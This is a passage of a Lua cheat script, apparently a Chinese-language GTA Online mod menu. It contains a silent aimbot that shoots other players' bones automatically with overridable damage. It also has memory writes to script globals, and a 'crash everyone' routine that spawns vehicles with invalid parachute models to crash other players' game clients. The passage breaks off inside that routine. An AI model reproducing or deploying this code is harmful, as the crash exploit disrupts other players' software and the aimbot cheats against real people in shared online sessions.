                if PED.IS_PED_A_PLAYER(v) then
                    local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(pid)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end
        end
    end
    return cur_tar
end

function ShootSingleBulletBetweenCoords(coords1, coords2, dmg, weaponhash, ownerped, audible, invisible, speed)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        coords1.x, coords1.y, coords1.z,
        coords2.x, coords2.y, coords2.z,
        dmg, true, weaponhash, ownerped, audible, invisible, speed)
end

function ShootBulletAtPedBone(ped, boneID, dmg, weaponHash, speed)
    local bonecoords = PED.GET_PED_BONE_COORDS(ped, boneID, 0, 0, 0)
    local ourped = GetLocalPed()

    local ourhead = PED.GET_PED_BONE_COORDS(ourped, 12844, 0, 0, 0); local ourfront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ourped, 0, 1, 0)
    ourfront.z = ourhead.z --to shoot out of infront of our head
    ShootSingleBulletBetweenCoords(ourfront, bonecoords, dmg, weaponHash, ourped, true, false, speed)
end

function GetPlayerName_ped(ped)
    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
    return playerName
end

function GetSuitableAimbotTarget(fov, fovcheck, dist, loscheck)
    local ourped = GetLocalPed()
    local distsq = dist * dist
    local ourc = ENTITY.GET_ENTITY_COORDS(ourped)
    local entTable = entities.get_all_peds_as_pointers()
    local inRange = {}
    for _, entity in pairs(entTable) do

        local entpos = entities.get_position(entity)

            if SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, entpos.x, entpos.y, entpos.z) <= distsq then --distance check

                local handle = entities.pointer_to_handle(entity)
                if (handle ~= ourped) then
                    if (not PED.IS_PED_DEAD_OR_DYING(handle)) and (INTERIOR.GET_INTERIOR_FROM_ENTITY(handle) == 0) then --dead/interior check

                        if (fovcheck and PED.IS_PED_FACING_PED(ourped, handle, fov)) or (not fovcheck) then --fov check

                            if (PED.IS_PED_A_PLAYER(handle)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)]) then --whitelist, player check

                                if (loscheck and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, handle, 17)) or (not loscheck) then --line-of-sight check
                                    inRange[#inRange+1] = handle
                                end
                            end
                        end
                    end
                end
            end

    end
    local retplayer
    local d = 99999999999
    if #inRange ~= 0 then
        for _, ped in pairs(inRange) do
            local tc = ENTITY.GET_ENTITY_COORDS(ped)
            local vidsti = SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, tc.x, tc.y, tc.z)
            if vidsti < d then
                retplayer = ped
                d = vidsti
            end
        end
        return retplayer
    end
    return nil
end
function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

function onStartup()
    SE_LocalPed = GetLocalPed()
end
function DoesTableContainValue(table, value)
    for _, v in pairs(table) do
        if v == value then return true end
    end
    return false
end

function FastTurnVehicleWithKeys(scale)
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velocity = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw - scale
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end

    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
        local yawAfterPress = vvYaw - scale
        if yawAfterPress < -180 then -- check for overflow
            local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
            local toSetYaw = overFlowNeg - scale
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
        else --if not overflow
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
        end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end
    v3.free(vv)
end
AIM_WHITELIST = {}

Silent_Aimbot = {
    hitboxes = {
        head = {hash = 12844, toggled = false},
        spine = {hash = 24817, toggled = false},
        pelvis = {hash = 11816, toggled = false},
    },

    fov = 2,
    dist = 300,
    dmg = 100,

    los_check = true,
    fov_check = true,

    hash = 177293209, --heavy sniper mk2 hash
    advanced = {
        speed = -1
    }
}

function start_silent_aimbot()
    saimbot_thread = util.create_thread(function (thr)
    while true do
        if not silent_aimbot then
            util.stop_thread()
        end
        local target = get_aimbot_target()
        if target ~= 0 then
            local t_pos = PED.GET_PED_BONE_COORDS(target, 31086, 0.01, 0, 0)
            local t_pos2 = PED.GET_PED_BONE_COORDS(target, 31086, -0.01, 0, 0.00)
            -- debug shit, ignore
            if false then
                GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
                GRAPHICS.DRAW_MARKER(0, t_pos2['x'], t_pos2['y'], t_pos2['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            end
            GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z']+2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                local wep = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
                local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
                if satarget_damageo then
                    dmg = sa_odmg
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(t_pos['x'], t_pos['y'], t_pos['z'], t_pos2['x'], t_pos2['y'], t_pos2['z'], dmg, true, wep, PLAYER.PLAYER_PED_ID(), true, false, 10000, veh)
            end
        end
        util.yield()
    end
end)
end

VEH_MISSILE_SPEED = 10000

MISL_AIM = false
missile_settings = {
    radius = 300,
    speed = 100,
    los = true,
    cam = false,
    ptfx = true,
    ptfx_scale = 1,
    air_target = false,
    multitarget = false,
    multiped = false
}
missile_particles = {
    name = "exp_grd_rpg_lod",
    dictionary = "core"
}
pvphelp = menu.list(selfc, "PvP助手", {"pvphelp"}, "")

menu.divider(pvphelp, "静默自瞄")

local silent_aimbotroot = menu.list(pvphelp, "静默自瞄1.0", {"lancescriptsilentaimbot"}, "")

menu.toggle(silent_aimbotroot, "静默自瞄", {"saimbottoggle"}, "", function(on) SE_Notifications = true
    silent_aimbot = on
    start_silent_aimbot()
end)

menu.toggle(silent_aimbotroot, "静默自瞄玩家", {"saimbotplayers"}, "", function(on)
    satarget_players = on
end)

menu.toggle(silent_aimbotroot, "静默自瞄NPC\'s", {"saimbotpeds"}, "", function(on)
    satarget_npcs = on
end)

menu.toggle(silent_aimbotroot, "用视野指定范围", {"saimbotusefov"}, "你不会通过你的屁眼杀人", function(on)
    satarget_usefov = on
end)

menu.slider(silent_aimbotroot, "视野", {"saimbotfov"}, "", 1, 270, 180, 1, function(s)
    sa_fov = s
end)

menu.toggle(silent_aimbotroot, "忽略车内目标", {"saimbotnovehicles"}, "如果你想装的更像个正常人, 或者射车内目标时遇到问题", function(on)
    satarget_novehicles = on
end)

satarget_nogodmode = true
menu.toggle(silent_aimbotroot, "忽略无敌目标", {"saimbotnogodmodes"}, "因为这有什么意义？", function(on)
    satarget_nogodmode = on
end, true)

menu.toggle(silent_aimbotroot, "好友成为目标", {"saimbottargetfriends"}, "", function(on)
    satarget_targetfriends = on
end)

menu.toggle(silent_aimbotroot, "伤害修改", {"saimbotdmgo"}, "", function(on)
    satarget_damageo = on
end)

menu.slider(silent_aimbotroot, "伤害修改的数值", {"saimbotdamageoverride"}, "", 1, 1000, 100, 1, function(s)
    sa_odmg = s
end)

menu.toggle_loop(pvphelp, "静默自瞄2.0", {}, "", function ()
    if PED.IS_PED_SHOOTING(GetLocalPed()) then --main start, checking.
        Silent_Aimbot.hash = WEAPON.GET_SELECTED_PED_WEAPON(GetLocalPed())
        local suitable = GetSuitableAimbotTarget(Silent_Aimbot.fov, Silent_Aimbot.fov_check,
            Silent_Aimbot.dist, Silent_Aimbot.los_check)

        if suitable ~= nil then
            local hitboxesCheckCount = 0
            for i, v in pairs(Silent_Aimbot.hitboxes) do
                if (v.toggled) then
                    ShootBulletAtPedBone(suitable, v.hash, Silent_Aimbot.dmg,
                        Silent_Aimbot.hash, Silent_Aimbot.advanced.speed)
                        if SE_Notifications then util.toast("射击 " .. i .. " 玩家的 " .. GetPlayerName_ped(suitable)) end
                        break
                else
                    hitboxesCheckCount = hitboxesCheckCount + 1
                end
            end
            if (hitboxesCheckCount == 3) then
                util.toast("没有选择打击点")
            end
        end
    end
end)
zhunxin = menu.list(pvphelp, "准星选择", {}, "", function(); end)--heezy
menu.toggle_loop(zhunxin, "瞄准准星 (!)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("!")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (#)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("#")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 ($)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("$")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (^)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("^")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.486,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (&)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("&")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (*)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("*")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.485,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (+)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("+")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.477,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (·)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("·")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.49997,0.478,0)
end)
local aimbot_settings = menu.list(pvphelp, "静默自瞄2.0设置", {}, "")
menu.divider(aimbot_settings, "---Settings---")
menu.slider(aimbot_settings, "伤害", {"saimdmg", "silentdamage"}, "伤害。 可能不准确。", 1, 10000, 100, 10, function (v) Silent_Aimbot.dmg = v end)
menu.slider(aimbot_settings, "范围", {"saimrange", "silentrange"}, "静默自瞄范围", 1, 10000, 300, 100, function (v) Silent_Aimbot.dist = v end)
menu.slider(aimbot_settings, "视野", {"saimfov", "silentfov"}, "静默自瞄视野", 1, 1000, 20, 1, function (v) Silent_Aimbot.fov = v/10 end)
menu.toggle(aimbot_settings, "视野检查", {}, "禁用视野检查。", function (toggle) Silent_Aimbot.fov_check = toggle end, true)
menu.toggle(aimbot_settings, "视线检查", {}, "禁用视线检查。", function (toggle) Silent_Aimbot.los_check = toggle end, true)
menu.divider(aimbot_settings, "---打击点---")
menu.toggle(aimbot_settings, "头", {"saimhead", "silenthead"}, "切换头部打击点。", function (toggle) Silent_Aimbot.hitboxes.head.toggled = toggle end)
menu.toggle(aimbot_settings, "脊柱/身体", {"saimspine", "saimbody", "silentbody"}, "切换身体打击点。", function (toggle) Silent_Aimbot.hitboxes.spine.toggled = toggle end)
menu.toggle(aimbot_settings, "骨盆", {"saimpelvis", "silentpelvis"}, "切换骨盆打击点。", function (toggle) Silent_Aimbot.hitboxes.pelvis.toggled = toggle end)
menu.divider(aimbot_settings, "---额外功能---")
menu.slider(aimbot_settings, "设定速度", {"silentspeed"}, "设置子弹的速度。 默认值为 -1。", -1, 2147483647, -1, 10, function (v) Silent_Aimbot.advanced.speed = v end)



--------------------------------------------------------------------------------------------------------------------------------
--自我

menu.toggle(selfc, "热成像隐身", {}, "使你在热成像的画面隐身", function(toggle)
    local player = players.user_ped()
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 1)
    end
end)

menu.toggle_loop(selfc, "快速切换武器", {}, "", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(selfc, "快速复活", {}, "", function()
    local player = players.user_ped()
    local pointr = entities.handle_to_pointer(player)
    if entities.get_health(pointr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(memory.script_global(2672505 + 1684 + 756), memory.read_int(memory.script_global(2672505 + 1684 + 756)) | 1 << 1) 
    end
end)

local maxHealth <const> = 328
menu.toggle_loop(selfc, ("人间蒸发"), {"undeadotr"}, "关闭雷达", function()
	if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end, function ()
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth)
end)

menu.toggle(selfc, "兔子模式", {""}, "", function(on)
    if on then
        menu.trigger_commands("ACRabbit02")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("mpmale")
    end
end)

local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}
------前滚翻
function has_anim_dict_loaded(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield(0)
    end
end
local i_forward = 360
function forward_roll()
    has_anim_dict_loaded("misschinese2_crystalmaze")
    TASK.TASK_PLAY_ANIM(players.user_ped(), "misschinese2_crystalmaze", "2int_loop_a_taotranslator", 8.0, 8.0, -1, 0, 0.0, 0, 0, 0)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local user_rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 0)
    local fwd_vect = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
    local speed = ENTITY.GET_ENTITY_SPEED(players.user_ped()) * 2.236936
    PED.SET_PED_CAN_RAGDOLL(players.user_ped(), false)
    ENTITY.SET_ENTITY_ROTATION(players.user_ped(), i_forward, user_rot.y, cam_rot.z, 2, true)
    if speed <= 70 then
        ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(), 3, fwd_vect.x, fwd_vect.y, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, false)
    end
    if i_forward <= 0 then i_forward = 360 else i_forward = i_forward - 6 end 
end
function end_forward_roll()
    util.yield(100)
    PED.SET_PED_CAN_RAGDOLL(players.user_ped(), true)
    TASK.STOP_ANIM_TASK(players.user_ped(), "misschinese2_crystalmaze", "2int_loop_a_taotranslator", 1)
end
menu.toggle_loop(selfc, "前滚翻", {}, "", function()
    forward_roll()
end, function()
    end_forward_roll()
end)
----街舞
local rotation = 0
local loop_count = 0
local dict, name
function breakdance()
    if loop_count <= 200 then
        dict = "missfbi5ig_20b"
        name = "hands_up_scientist"
    elseif loop_count <= 400 then
        dict = "nm@hands"
        name = "hands_up"
    elseif loop_count <= 600 then
        dict = "missheist_agency2ahands_up"
        name = "handsup_anxious"
    elseif loop_count <= 800 then
        dict = "missheist_agency2ahands_up"
        name = "handsup_loop"
    end
    ENTITY.SET_ENTITY_ROTATION(players.user_ped(), 180, 0, rotation, 1, true)
    has_anim_dict_loaded(dict)
    TASK.TASK_PLAY_ANIM(players.user_ped(), dict, name, 8.0, 0, -1, 0, 0.0, 0, 0, 0)
    rotation = rotation + 5
    if loop_count < 1000 then
        loop_count = loop_count + 1
    else
        loop_count = 0
    end
end
function end_breakdance()
    util.yield(100)
    TASK.STOP_ANIM_TASK(players.user_ped(), dict, name, 1)
end
menu.toggle_loop(selfc, "街舞", {}, "", function()
    breakdance()
end, function()
    end_breakdance()
end)


menu.toggle_loop(selfc, "力场", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)
menu.toggle_loop(selfc, '人物旋转', {''}, '', function(f)
    xuanzhuan = f
        while xuanzhuan do
        wait(0)
        ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(players.user()), 5, 200.0000001, 8207.0, 89207.8207, 10.0, 10.0, 100.0, 10000.0, false, true)
        end
    end)
menu.toggle_loop(selfc,'旋转抽搐', {''}, '', function(f) 
    xuanzhuan = f     
    while xuanzhuan do         
        ENTITY.SET_ENTITY_ROTATION(players.user_ped(players.user()), math.random(-180, 180), math.random(-180, 180), math.random(-180, 180), 0, true)         
        wait()     
    end 
end)
menu.toggle_loop(selfc,"旋转抽搐(全局)", {"全局人物抽搐"}, "", function(on)
    for k, peds in pairs(entities.get_all_peds_as_handles()) do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds)
    local rand_1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(peds, math.random(-500, 500), math.random(-500, 500), 300.0)
        if not PAD.IS_CONTROL_PRESSED(71, 71) then
            ENTITY.SET_ENTITY_ROTATION(peds, rand_1['x'], rand_1['y'], rand_1['z'])
        end
    end
end)
menu.slider(selfc, "人物透明度", {"transparency"}, "", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)


--------------------------------------------------------------------------------------------------------------------------------
--线上选项



menu.toggle(online, "隐藏输入状态", {}, "", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.toggle_loop(online, "自动同意加入", {}, "", function() 
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(50)
    end
end)


joining = false
menu.toggle(online, "玩家加入通知", {}, "玩家加入战局时通知", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

local maxps = menu.list(online, "主机工具", {}, "")

menu.slider(maxps, "设置战局玩家上限", {}, "只有你是战局主机时才生效", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)
menu.slider(maxps, "设置战局观众上限", {}, "只有你是战局主机时才生效", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

local crashall = menu.list(online, "全局崩溃", {}, "")

menu.action(crashall, "无效降落伞Plus", {}, "By YIYU", function ()
    util.toast("开始崩溃")
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    --^^
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    ---^^
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(100)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	3235319999)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2000, false, true, true)
        util.yield(120)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(120)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(100)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	546252211)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end


    for i = 1, 8 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	148511758)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 500, false, true, true)
        util.yield(100)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end
    util.yield(200)

    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
